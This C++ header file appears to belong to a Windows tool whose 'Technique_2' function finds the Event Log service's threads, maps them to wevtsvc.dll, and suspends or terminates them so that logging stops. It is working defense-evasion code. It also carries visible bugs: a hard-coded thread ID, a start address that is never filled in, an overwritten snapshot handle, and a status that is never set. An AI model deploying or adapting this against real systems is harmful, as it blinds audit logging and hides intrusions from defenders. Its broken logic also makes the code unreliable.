#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <strsafe.h>
#include "windows-api-ex.h"

std::string readpChar(HANDLE hProcess, DWORD64 address) {
	try {
		if (address != 0) {
			const size_t namesize = 200;
			char x[namesize];
			ReadProcessMemory(hProcess, (LPCVOID)address, &x, namesize, NULL);
			std::string tmpname = std::string(&x[0], &x[namesize]);
			char* czech = strtok(&tmpname[0], "\0");
			if (czech != nullptr) return czech;
		}
	}
	catch (const std::exception& exc) {}
	return std::string("");
}

// Inspired from http://www.rohitab.com/discuss/topic/36675-how-to-get-the-module-name-associated-with-a-thread/?p=10078697
BOOL Technique_2(DWORD dwEventLogPID) {

	typedef struct _CLIENT_ID {
		HANDLE UniqueProcess;
		HANDLE UniqueThread;
	} CLIENT_ID;

	typedef struct _THREAD_BASIC_INFORMATION {
		NTSTATUS    exitStatus;
		PVOID       pTebBaseAddress;
		CLIENT_ID   clientId;
		KAFFINITY	AffinityMask;
		int			Priority;
		int			BasePriority;
		int			v;

	} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

	typedef enum _SC_SERVICE_TAG_QUERY_TYPE {
		ServiceNameFromTagInformation = 1,
		ServiceNameReferencingModuleInformation,
		ServiceNameTagMappingInformation,
	} SC_SERVICE_TAG_QUERY_TYPE, * PSC_SERVICE_TAG_QUERY_TYPE;

	typedef struct _SC_SERVICE_TAG_QUERY {
		ULONG   processId;
		ULONG   serviceTag;
		ULONG   reserved;
		PVOID   pBuffer;
	} SC_SERVICE_TAG_QUERY, * PSC_SERVICE_TAG_QUERY;

	HMODULE hAdvapi32 = GetModuleHandleA("advapi32.dll");
	typedef ULONG(WINAPI* _I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);


	printf("[*] Using Technique-2 for killing threads...\n");

	BOOL killStatus = FALSE;

	HANDLE hEvtSnapshot = NULL;
	HANDLE hEvtThread = NULL;

	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	te32.cntUsage = 0;

	MODULEENTRY32 me32;
	me32.dwSize = sizeof(MODULEENTRY32);
	me32.th32ModuleID = 1;
	SC_SERVICE_TAG_QUERY scTagQuery = { 0 };
	ULONG hTag = NULL;

	_I_QueryTagInformation I_QueryTagInformation = (_I_QueryTagInformation)GetProcAddress(hAdvapi32, "I_QueryTagInformation");

	THREAD_BASIC_INFORMATION tbi = { 0 };
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	if ((hEvtSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
		BOOL ok = Thread32First(hEvtSnapshot, &te32);

		while (ok) {

			if (te32.th32OwnerProcessID == dwEventLogPID) {
				hEvtThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE, FALSE, 12716);

				if (hEvtThread != NULL) {

					HANDLE hNewThreadHandle;
					DWORD64 dwThreadStartAddr = 0;

					if (hNtdll != NULL) {

						typedef NTSTATUS(WINAPI* _NtQueryInfomationThread)(HANDLE, LONG, PVOID, ULONG, PULONG);

						_NtQueryInfomationThread NtQueryInformationThread;
						HANDLE hEvtProcess = OpenProcess(PROCESS_VM_READ, FALSE, te32.th32OwnerProcessID);

						if ((NtQueryInformationThread = (_NtQueryInfomationThread)GetProcAddress(hNtdll, "NtQueryInformationThread"))) {
							HANDLE Invalid = (HANDLE)-1;
							HANDLE hPeusdoCurrentProcess = GetCurrentProcess();
		
							C::Thread::GetThreadStartAddress(hEvtThread);

							printf("[!] Pid %d has Thread id %d, suspending....\n", te32.th32OwnerProcessID, te32.th32ThreadID);
							DWORD res = SuspendThread(hEvtThread);
							if (res == -1) {
								printf("[!] Thread %d is detected but suspend failed. Error code is: %d\n", te32.th32ThreadID, GetLastError());
							}
							//TerminateThread(hEvtThread,0);
							/*if (DuplicateHandle(hPeusdoCurrentProcess, hEvtThread, hPeusdoCurrentProcess, &hNewThreadHandle, THREAD_QUERY_INFORMATION, FALSE, 0)) {

								NtQueryInformationThread(hNewThreadHandle, 9, &dwThreadStartAddr, sizeof(DWORD64), NULL);
								CloseHandle(hNewThreadHandle);

							}*/

						}

					}

					char moduleName[MAX_PATH] = { 0 };
					size_t cbDest = MAX_PATH * sizeof(char);
					hEvtSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwEventLogPID);
					if (Module32First(hEvtSnapshot, &me32)) {

						if (dwThreadStartAddr >= (DWORD_PTR)me32.modBaseAddr && dwThreadStartAddr <= ((DWORD_PTR)me32.modBaseAddr + me32.modBaseSize)) {

							StringCbPrintfA(moduleName, cbDest, "%ws", me32.szExePath);
							printf("[!] Pid %d (module %s) has Thread id %d, name %s\n", me32.th32ProcessID, me32.szModule, te32.th32ThreadID, moduleName);

						}
						else {

							while (Module32Next(hEvtSnapshot, &me32)) {

								if (dwThreadStartAddr >= (DWORD_PTR)me32.modBaseAddr && dwThreadStartAddr <= ((DWORD_PTR)me32.modBaseAddr + me32.modBaseSize)) {

									StringCbPrintfA(moduleName, cbDest, "%ws", me32.szExePath);
									printf("[!] Pid %d (module %s) has Thread id %d, name %s\n", me32.th32ProcessID, me32.szModule, te32.th32ThreadID, moduleName);
									break;

								}

							}

						}

					}

					if (strstr(moduleName, "wevtsvc.dll")) {

						if (TerminateThread(hEvtThread, 0) == 0) {

							printf("[!] Thread %d is detected but kill failed. Error code is: %d\n", te32.th32ThreadID, GetLastError());

						}
						else {

							printf("[+] Thread %d is detected and successfully killed.\n", te32.th32ThreadID);

						}

					}

					CloseHandle(hEvtThread);

				}
				
			}
			ok = Thread32Next(hEvtSnapshot, &te32);
		}

	}

	CloseHandle(hEvtSnapshot);

	return killStatus;
}